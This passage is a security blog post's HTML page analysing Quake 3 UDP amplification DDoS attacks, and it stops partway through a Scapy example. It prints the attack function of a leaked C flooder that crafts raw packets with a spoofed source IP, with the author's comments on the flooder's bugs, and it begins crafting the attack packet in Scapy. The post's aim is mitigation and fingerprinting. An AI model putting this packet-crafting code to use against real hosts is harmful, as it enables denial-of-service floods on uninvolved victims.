
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Amplification DDoS attack with Quake3 servers: An analysis (1/2) - Alejandro Nolla - z0mbiehunt3r</title>
  <meta name="author" content="Alejandro Nolla">

  
  <meta name="description" content="Introduction Lately has been growing in popularity those DDoS attacks based on DNS Amplification, specifically due to the attack to Spamhaus. While &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <link href="/atom.xml" rel="alternate" title="Alejandro Nolla - z0mbiehunt3r" type="application/atom+xml">
  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-39408435-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body >
	<div class="all">
		<section class="sidebar align-center">
			<header>
				<a href="/">
	<div class="profile_picture"></div>
	<h1>Alejandro Nolla</h1>
</a>
<div class="slogan hide-mobile">
</div>
<div class="social">
	<a href="http://twitter.com/z0mbiehunt3r">
		<div class="button twitter">
			<span class="icon-twitter"></span>
		</div>
	</a>
	<a href="http://www.linkedin.com/in/alejandronollablanco">
		<div class="button linkedin">
			<span class="icon-linkedin"></span>
		</div>
	</a>
	<a href="http://github.com/z0mbiehunt3r">
		<div class="button github">
			<span class="icon-github"></span>
		</div>
	</a>
	<a href="mailto:alejandro.nolla@gmail.com">
		<div class="button email">
			<span class="icon-envelope"></span>
		</div>
	</a>
	<a href="/atom.xml">
		<div class="button rss">
			<span class="icon-rss"></span>
		</div>
	</a>
</div>

			</header>
		</section>
		<section class="content">
			<div class="wrapper">
				<div>
<article class="hentry" role="article">
  <div class="title">
    
      <h1 class="entry-title">Amplification DDoS Attack With Quake3 Servers: An Analysis (1/2)</h1>
    
</div>

<div class="info">
  <i class="icon-calendar"></i> 








  


<time datetime="2013-06-24T13:52:00+02:00" pubdate data-updated="true">2013-06-24</time> &nbsp;&nbsp;
  
  <i class="icon-comment-alt"></i> <a href="#disqus_thread">Comments</a>
  
</div>

<div class="post">
  
  <div class="entry-content"><h2>Introduction</h2>

<p>Lately has been growing in popularity those DDoS attacks based on <a href="http://www.us-cert.gov/ncas/alerts/TA13-088A">DNS Amplification</a>, specifically due to the <a href="http://blog.cloudflare.com/the-ddos-that-almost-broke-the-internet">attack</a> to Spamhaus. While this kind of attack is becoming more and more popular at DDoS scenarios there are others types of DDoS techniques being used not so common and which should be known before being hitted by them. In this post i want to introduce amplification attacks using Quake 3 network protocol - UDP based - as well as how to analyze it in several ways to really understand it in depth to find a pattern and create a fingerprint for trying mitigating them. <!-- more --></p>

<h2>How does this attack works</h2>

<p>This kind of DDoS is very similar to a DNS Amplification Attack, an attacker send thousands of UDP datagrams pretending to be a legitimate Quake 3 client asking for game status with source IP address spoofed using the one wanted to be flooded, then, queried Quake 3 servers will answer with game status - including some server configuration options and user list - to spoofed source IP address, flooding it with thousands of unsolicited UDP datagrams.</p>

<p>I have done a basic draw for illustrating it:<br/>
<img src="/images/upload/2013/06/quake3_ddos.png"></p>

<p>As shown, amplifiers servers - Quake 3 ones - will flood victim with an aggregated throughput much higher than the used by attacker (hence it &#8220;amplifier&#8221; term); lets see some traffic generated if we make this &#8220;getstatus&#8221; request:</p>

<figure class='code'><figcaption><span>showing some info about getstatus request with tshark </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>tshark -r udp_quake3_reflected_clean.pcap.cloaked -z conv,udp
</span><span class='line'>  1   0.000000 192.168.1.39 -&gt; 128.66.0.59  QUAKE3 56 Connectionless Client to Server
</span><span class='line'>  2   0.213635  128.66.0.59 -&gt; 192.168.1.39 QUAKE3 1373 Connectionless Server to <span class="nv">Client</span>
</span><span class='line'><span class="o">================================================================================</span>
</span><span class='line'>UDP Conversations
</span><span class='line'>Filter:&lt;No Filter&gt;
</span><span class='line'>                                               |       &lt;-      | |       -&gt;      | |     Total     |
</span><span class='line'>                                               | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |
</span><span class='line'>192.168.1.39:32511   &lt;-&gt; 128.66.0.59:27960          1      1373       1        56       2      <span class="nv">1429</span>
</span><span class='line'><span class="o">================================================================================</span>
</span></code></pre></td></tr></table></div></figure>


<p>If we calculate amplification ratio we find that sending an UDP datagram of 56 bytes will trigger a response of 1373 bytes, achieving about x24,5 amplification ratio, not bad after all.</p>

<h2>Installing Quake 3 server (amplifier)</h2>

<p>We are going to need a Quake 3 server for being used as &#8220;amplifier&#8221; to attack our victim when doing some local tests, so we are going to need an original copy of Quake 3 and compiling <a href="http://ioquake3.org/">ioquake3</a>, an open source Quake 3 engine based on id Software source code (publicly released in 2005).</p>

<figure class='code'><figcaption><span>installing prerequisites and ioquake3 server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># apt-get install libsdl1.2-dev -y</span>
</span><span class='line'>~<span class="nv">$ </span>git clone git://github.com/ioquake/ioq3.git
</span><span class='line'>~<span class="nv">$ </span><span class="nb">cd </span>ioq3/
</span><span class='line'>~/ioq3<span class="nv">$ </span>make
</span></code></pre></td></tr></table></div></figure>


<p>Now we need to copy Quake 3 original pak files (those with models and textures) from our cdrom to our hdd prior being able to run an ioq3 server:</p>

<figure class='code'><figcaption><span>copying pak files to our hdd and starting ioq3 server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~<span class="nv">$ </span>mkdir .baseq3
</span><span class='line'>/quake3/baseq3<span class="nv">$ </span>cp *.pk3 /home/z0mbiehunt3r/.q3a/baseq3
</span><span class='line'>~<span class="nv">$ </span><span class="c"># now start server</span>
</span><span class='line'>~/ioq3/build/release-linux-x86_64<span class="nv">$ </span>./ioq3ded.x86_64 +set net_ip YOUR_LAN_IP +map q3dm1
</span><span class='line'>ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
</span><span class='line'>Have SSE support
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Hunk_Clear: reset the hunk ok
</span><span class='line'>--- Common Initialization Complete ---
</span><span class='line'>IP: 127.0.0.1
</span><span class='line'>IP: 192.168.1.39
</span><span class='line'>Opening IP socket: 192.168.1.39:27960
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>------------ Map Loading ------------
</span><span class='line'>trying to load maps/q3dm1.aas
</span><span class='line'>loaded maps/q3dm1.aas
</span><span class='line'>found 18 level items
</span><span class='line'>-------------------------------------
</span><span class='line'>32 bots parsed
</span><span class='line'>35 arenas parsed
</span><span class='line'>AAS initialized.
</span><span class='line'>-----------------------------------
</span><span class='line'><span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our ioq3 server is ready to make some frags!, we can check it with <a href="http://nmap.org/nsedoc/scripts/quake3-info.html">quake3-info.nse</a> script:</p>

<figure class='code'><figcaption><span>scanning our Quake 3 server with nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./nmap -sU -p27960 -Pn -n 192.168.1.39 --reason --script=quake3-info</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.26SVN <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2013-06-16 00:23 CEST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.1.39
</span><span class='line'>Host is up, received user-set <span class="o">(</span>0.00021s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE REASON
</span><span class='line'>27960/udp open  quake3  udp-response
</span><span class='line'>| quake3-info:
</span><span class='line'>|   BASIC OPTIONS:
</span><span class='line'>|     capturelimit: 8
</span><span class='line'>|     dmflags: 0
</span><span class='line'>|     fraglimit: 20
</span><span class='line'>|     gamename: baseq3
</span><span class='line'>|     mapname: q3dm1
</span><span class='line'>|     timelimit: 0
</span><span class='line'>|     version: ioq3 1.36_GIT_7b15415-2013-06-10 linux-x86_64 Jun 15 2013
</span><span class='line'>|   OTHER OPTIONS:
</span><span class='line'>|     bot_minplayers: 0
</span><span class='line'>|     com_gamename: Quake3Arena
</span><span class='line'>|     com_protocol: 71
</span><span class='line'>|     g_gametype: 0
</span><span class='line'>|     g_maxGameClients: 0
</span><span class='line'>|     g_needpass: 0
</span><span class='line'>|     sv_allowDownload: 0
</span><span class='line'>|     sv_dlRate: 100
</span><span class='line'>|     sv_floodProtect: 1
</span><span class='line'>|     sv_hostname: c0meG3tS0m3
</span><span class='line'>|     sv_maxPing: 0
</span><span class='line'>|     sv_maxRate: 0
</span><span class='line'>|     sv_maxclients: 8
</span><span class='line'>|     sv_minPing: 0
</span><span class='line'>|     sv_minRate: 0
</span><span class='line'>|_    sv_privateClients: 0
</span><span class='line'>Service Info: OS: Linux
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 0.15 seconds
</span></code></pre></td></tr></table></div></figure>


<h2>Analyzing attackers script</h2>

<p>Commonly used scripts for this kind of attacks has been leaked repeatedly so i&#8217;m not going to hide it (regardless of the fact those who DDoS already have it or more powerful attack vectors), so <a href="/images/upload/2013/06/udp.c">here</a> is a C Quake 3 amplification flooder made upon a generic UDP flooder.</p>

<p>It&#8217;s interesting the way UDP datagrams are assembled, so let&#8217;s go to analyze it (thanks to <a href="https://twitter.com/NighterMan">NighterMan‎</a> for helping me with my rusted C knowledge), i have made some comments below about found mistakes, particularly at networking knowledge (the tool doesn&#8217;t even work rigth to trigger amplified response):</p>

<figure class='code'><figcaption><span>Quake 3 DDoS amplification attack function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[...]</span>
</span><span class='line'><span class="c1">// this is the UDP payload for &quot;geststatus&quot; message</span>
</span><span class='line'><span class="n">param</span><span class="p">.</span><span class="n">message</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">attack function is called with following args, being params-&gt;list[i].ip and params-&gt;list[i].port Quake 3 server data</span>
</span><span class='line'><span class="cm">attack(params-&gt;victim_ip, rand() % 65534 + 1, params-&gt;list[i].ip, params-&gt;list[i].port, params-&gt;message);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="n">attack</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">srcip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">srcport</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">destip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">destport</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    When sending TCP/UDP segments/datagrams with raw sockets we need a pseudo header to calculate checksum value,</span>
</span><span class='line'><span class="cm">    not used in this case and probably forgot when ripping it from this SYN flooder</span>
</span><span class='line'><span class="cm">    https://gist.github.com/z0mbiehunt3r/5790220</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">destport</span><span class="p">);</span>
</span><span class='line'>    <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">destip</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">memset</span> <span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    To read more about Internet Header Length and Type Of Service check rfc791</span>
</span><span class='line'><span class="cm">    https://tools.ietf.org/html/rfc791#page-11</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    Actually ToS field in IP header is made up of a six bit &quot;Differentiated services field&quot;</span>
</span><span class='line'><span class="cm">    and two bit &quot;Explicit Congestion Notification&quot; field.</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Read http://tools.ietf.org/html/rfc2474 and http://tools.ietf.org/html/rfc3168 about them</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Explicit Congestion Notification set as a Not ECN-Capable Transport, probably with intention</span>
</span><span class='line'><span class="cm">    of bypassing/messing around congestion mitigation mechanisms ;)</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">)</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// htonl will produce a long instead of a short (IPID value is 16 bits), kernel will fix this value</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htonl</span> <span class="p">(</span><span class="mi">54321</span><span class="p">);</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_UDP</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// rely IP header checksum to kernel</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">srcip</span><span class="p">;</span>
</span><span class='line'>    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">udph</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">srcport</span><span class="p">);</span>
</span><span class='line'>    <span class="n">udph</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">destport</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    As specified at rfc768: &quot;Length is the length in octets of this user datagram including this header</span>
</span><span class='line'><span class="cm">    and the data. (This  means  the minimum value of the length is eight.)&quot;</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Above is UDP length computed withoud having in mind UDP payload, so it will be wrong, DPI and protocol </span>
</span><span class='line'><span class="cm">    anomaly detection are more than welcome ;)</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    Additionally, specifying a bad UDP length have an important side effect in this flooder, it won&#39;t work</span>
</span><span class='line'><span class="cm">    because upper layers are not going to receive correct payload, in this case quake3 server will answer</span>
</span><span class='line'><span class="cm">    with a disconnect command instead of server&#39; status, so no amplification</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>    <span class="n">udph</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/*</span>
</span><span class='line'><span class="cm">    As specified at rfc768: &quot;An all zero  transmitted checksum  value means that the transmitter</span>
</span><span class='line'><span class="cm">    generated  no checksum  (for debugging or for higher level protocols that don&#39;t care).&quot;</span>
</span><span class='line'><span class="cm">    </span>
</span><span class='line'><span class="cm">    could be useful sometimes when defining attacking patterns</span>
</span><span class='line'><span class="cm">    */</span>
</span><span class='line'>  <span class="n">udph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">udph</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">),</span><span class="n">message</span><span class="p">,</span> <span class="mi">4096</span> <span class="o">-</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">udphdr</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)));</span>
</span><span class='line'>  
</span><span class='line'>  <span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;[x] Cannot set socket options (are we r00t?)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">packet</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;[x] Error sending packet</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">close</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>There isn&#8217;t much more to say about this, just highlight the fact that using htonl() instead of htons() avoid us using fixed IP ID value when finding an attack pattern. Also found interesting the specified IP ToS value to mess around with congestion detection and avoidance mechanisms, but contrasts with some mistakes that make easier to spot attacking datagrams generated by this tool and, even more unvelievable, incorrect UDP length transform amplification attack just in a plain UDP spoofed attack (probably made some copy paste from here and there), seems some guys need to read a bit about network protocols before playing with DDoS tools&#8230;</p>

<h2>Crafting Quake 3 amplification attack packet with Scapy</h2>

<p>Probably the quick and easiest way to craft packets when doing network tests is <a href="http://www.secdev.org/projects/scapy/">Scapy</a>, a python tool to create and manipulate network packets that can be used within his own interactive shell or just as a python package.</p>

<p>Below is an example for crafting this kind of attack with scapy, without spoofing IP address (we want to check answer) and with a correct UDP length value and checksum (scapy will automagically compute values like length and checksum prior of sending any packet):</p>

<figure class='code'><figcaption><span>crafting Quake 3 amplification attack packet with scapy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># scapy</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">random</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;QUAKE3_SERVER_IP&quot;</span><span class="p">,</span> <span class="n">ihl</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">tos</span><span class="o">=</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">255</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xFFFF</span><span class="p">))</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">32511</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">27960</span><span class="p">)</span>
